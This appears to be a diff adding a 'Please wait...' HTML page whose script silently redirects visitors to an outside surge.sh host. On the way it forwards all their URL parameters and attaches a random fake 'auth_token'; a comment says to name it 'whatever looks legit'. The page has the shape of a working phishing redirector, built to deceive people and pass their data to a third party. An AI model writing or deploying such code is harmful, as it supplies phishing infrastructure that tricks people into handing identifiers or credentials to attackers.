@@ -1,0 +1,36 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Please wait...</title>
+  <script>
+    // Generate a random jargon string (base64 encoded and URL-safe)
+    function generateJargon(length = 96) {
+      const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      let result = "";
+      for (let i = 0; i < length; i++) {
+        result += charset.charAt(Math.floor(Math.random() * charset.length));
+      }
+      return encodeURIComponent(btoa(result)); // Base64 + URI encode
+    }
+
+    // Get current URL parameters
+    const params = new URLSearchParams(window.location.search);
+
+    // Append the jargon as a new parameter
+    params.set("auth_token", generateJargon());  // name it whatever looks legit
+
+    // Set the redirect base URL
+    const baseURL = "https://hub-cart.surge.sh/access.html";
+
+    // Final redirect URL with params + jargon
+    const redirectURL = baseURL + "?" + params.toString();
+
+    // Redirect
+    window.location.href = redirectURL;
+  </script>
+</head>
+<body>
+  Please wait...
+</body>
+</html>
